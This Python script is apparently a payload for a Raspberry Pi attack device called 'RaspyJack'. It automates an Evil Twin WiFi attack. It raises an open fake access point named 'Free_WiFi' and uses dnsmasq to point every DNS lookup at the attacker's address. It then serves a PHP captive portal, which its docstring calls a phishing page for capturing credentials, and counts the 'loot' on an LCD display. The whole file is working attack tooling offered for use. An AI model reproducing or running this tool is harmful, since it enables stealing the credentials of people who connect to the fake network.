#!/usr/bin/env python3
"""
RaspyJack *payload* – **Evil Twin with Captive Portal**
=======================================================
This script automates the setup of an Evil Twin access point. It creates a
fake WiFi network and redirects all connecting clients to a captive portal
(phishing page) to capture credentials.

This is an advanced payload that requires `hostapd`, `dnsmasq`, and `php`
to be installed.

Features:
1.  Stops conflicting network services.
2.  Dynamically creates configuration files for hostapd and dnsmasq.
3.  Starts a fake AP, a DHCP/DNS server, and a PHP web server.
4.  Monitors dnsmasq.leases to show connected clients.
5.  Monitors the loot file for captured credentials.
6.  Provides a real-time status display on the LCD.
7.  Cleans up all processes and restores network state on exit.
"""

# ---------------------------------------------------------------------------
# 0) Imports & boilerplate
# ---------------------------------------------------------------------------
import os, sys, subprocess, signal, time, threading
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))

# ---------------------------- Third‑party libs ----------------------------
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont

# ---------------------------------------------------------------------------
# 1) GPIO mapping (BCM)
# ---------------------------------------------------------------------------
PINS: dict[str, int] = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13,
    "KEY1": 21, "KEY2": 20, "KEY3": 16,
}

# ---------------------------------------------------------------------------
# 2) GPIO & LCD initialisation
# ---------------------------------------------------------------------------
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = 128, 128
FONT = ImageFont.load_default()
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
FONT_UI = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 10)

# ---------------------------------------------------------------------------
# 3) Global State & Configuration
# ---------------------------------------------------------------------------
WIFI_INTERFACE = "wlan1"  # Must support AP mode
FAKE_AP_SSID = "Free_WiFi"
FAKE_AP_CHANNEL = "6"
CAPTIVE_PORTAL_PATH = "/root/Raspyjack/DNSSpoof/sites/wifi/"
LOOT_FILE = os.path.join(CAPTIVE_PORTAL_PATH, "ip.txt")
TEMP_CONF_DIR = "/tmp/raspyjack_eviltwin/"

running = True
attack_processes = {}
status_info = {
    "clients": 0,
    "credentials": 0
}

# ---------------------------------------------------------------------------
# 4) Graceful shutdown
# ---------------------------------------------------------------------------
def cleanup(*_):
    global running
    if running:
        running = False
        stop_attack()

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

# ---------------------------------------------------------------------------
# 5) UI Functions
# ---------------------------------------------------------------------------
def draw_message(message: str, color: str = "yellow"):
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ImageDraw.Draw(img)
    bbox = d.textbbox((0, 0), message, font=FONT_TITLE)
    w, h = bbox[2] - bbox[0], bbox[3] - bbox[1]
    x = (WIDTH - w) // 2
    y = (HEIGHT - h) // 2
    d.text((x, y), message, font=FONT_TITLE, fill=color)
    LCD.LCD_ShowImage(img, 0, 0)

def draw_ui(status: str):
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ImageDraw.Draw(img)

    d.text((5, 5), "Evil Twin Attack", font=FONT_TITLE, fill="#00FF00")
    d.line([(0, 22), (128, 22)], fill="#00FF00", width=1)

    status_color = "lime" if status == "ACTIVE" else "red"
    d.text((30, 25), status, font=FONT_TITLE, fill=status_color)

    d.text((5, 45), f"SSID: {FAKE_AP_SSID}", font=FONT_UI, fill="white")
    d.text((5, 60), f"Clients: {status_info['clients']}", font=FONT_UI, fill="yellow")
    d.text((5, 75), f"Creds: {status_info['credentials']}", font=FONT_UI, fill="orange")

    d.text((5, 110), "OK=Stop | KEY3=Exit", font=FONT, fill="cyan")
    LCD.LCD_ShowImage(img, 0, 0)

# ---------------------------------------------------------------------------
# 6) Core Attack Functions
# ---------------------------------------------------------------------------
def check_dependencies():
    deps = ["hostapd", "dnsmasq", "php"]
    for dep in deps:
        if subprocess.run(f"which {dep}", shell=True, capture_output=True).returncode != 0:
            return dep
    return None

def stop_interfering_services():
    subprocess.run("pkill wpa_supplicant", shell=True)
    subprocess.run("pkill dhclient", shell=True)
    subprocess.run("pkill dnsmasq", shell=True)
    subprocess.run("pkill hostapd", shell=True)
    subprocess.run("pkill php", shell=True)
    time.sleep(2)

def create_configs():
    os.makedirs(TEMP_CONF_DIR, exist_ok=True)
    
    # hostapd.conf
    hostapd_conf_path = os.path.join(TEMP_CONF_DIR, "hostapd.conf")
    hostapd_conf = f"""
interface={WIFI_INTERFACE}
driver=nl80211
ssid={FAKE_AP_SSID}
hw_mode=g
channel={FAKE_AP_CHANNEL}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""
    with open(hostapd_conf_path, "w") as f:
        f.write(hostapd_conf)

    # dnsmasq.conf
    dnsmasq_conf_path = os.path.join(TEMP_CONF_DIR, "dnsmasq.conf")
    dnsmasq_conf = f"""
interface={WIFI_INTERFACE}
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
address=/#/10.0.0.1
"""
    with open(dnsmasq_conf_path, "w") as f:
        f.write(dnsmasq_conf)
    
    return hostapd_conf_path, dnsmasq_conf_path

def start_attack():
    global attack_processes
    stop_interfering_services()
    hostapd_conf, dnsmasq_conf = create_configs()

    # Clear old loot
    if os.path.exists(LOOT_FILE):
        os.remove(LOOT_FILE)

    try:
        # Configure interface
        subprocess.run(f"ifconfig {WIFI_INTERFACE} up 10.0.0.1 netmask 255.255.255.0", shell=True, check=True)
        
        # Start hostapd
        cmd_hostapd = f"hostapd {hostapd_conf}"
        attack_processes['hostapd'] = subprocess.Popen(cmd_hostapd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(2)

        # Start dnsmasq
        cmd_dnsmasq = f"dnsmasq -C {dnsmasq_conf} -d"
        attack_processes['dnsmasq'] = subprocess.Popen(cmd_dnsmasq, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(2)

        # Start PHP server for captive portal
        cmd_php = f"php -S 10.0.0.1:80 -t {CAPTIVE_PORTAL_PATH}"
        attack_processes['php'] = subprocess.Popen(cmd_php, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        return True
    except (subprocess.CalledProcessError, FileNotFoundError) as e:
        print(f"Error starting attack services: {e}", file=sys.stderr)
        return False

def stop_attack():
    for name, proc in attack_processes.items():
        try:
            os.kill(proc.pid, signal.SIGTERM)
        except ProcessLookupError:
            pass
    attack_processes.clear()
    
    # Restore networking
    stop_interfering_services()
    subprocess.run(f"ifconfig {WIFI_INTERFACE} down", shell=True)
    subprocess.run(f"iwconfig {WIFI_INTERFACE} mode managed", shell=True)
    subprocess.run(f"ifconfig {WIFI_INTERFACE} up", shell=True)
    # Maybe run `systemctl restart dhcpcd` or similar
    
    # Clean up temp files
    if os.path.exists(TEMP_CONF_DIR):
        subprocess.run(f"rm -rf {TEMP_CONF_DIR}", shell=True)

def monitor_status():
    """Thread to monitor lease and loot files."""
    while running:
        # Count clients
        try:
            with open("/var/lib/misc/dnsmasq.leases", "r") as f:
                status_info["clients"] = len(f.readlines())
        except FileNotFoundError:
            status_info["clients"] = 0
            
        # Count credentials
        try:
            with open(LOOT_FILE, "r") as f:
                status_info["credentials"] = len(f.readlines())
        except FileNotFoundError:
            status_info["credentials"] = 0
            
        time.sleep(5)

# ---------------------------------------------------------------------------
# 7) Main Loop
# ---------------------------------------------------------------------------
try:
    is_attacking = False
    
    dep_missing = check_dependencies()
    if dep_missing:
        draw_message(f"{dep_missing} not found!", "red")
        time.sleep(5)
        raise SystemExit(f"{dep_missing} not found")

    draw_ui("STOPPED")

    while running:
        if GPIO.input(PINS["KEY3"]) == 0 or GPIO.input(PINS["OK"]) == 0:
            if is_attacking:
                draw_message("Stopping...")
                cleanup()
            else: # If stopped, any key exits
                cleanup()
            break

        if not is_attacking:
            draw_message("Press OK to start")
            if GPIO.input(PINS["OK"]) == 0:
                draw_message("Starting...")
                if start_attack():
                    is_attacking = True
                    threading.Thread(target=monitor_status, daemon=True).start()
                else:
                    draw_message("Attack FAILED", "red")
                    cleanup()
                time.sleep(2)
        else:
            draw_ui("ACTIVE")

        time.sleep(1)

except (KeyboardInterrupt, SystemExit):
    pass
except Exception as e:
    print(f"[ERROR] {e}", file=sys.stderr)
    draw_message(f"ERROR:\n{str(e)[:20]}", "red")
    time.sleep(3)
finally:
    cleanup()
    draw_message("Cleaning up...")
    time.sleep(2)
    LCD.LCD_Clear()
    GPIO.cleanup()
    print("Evil Twin payload finished.")
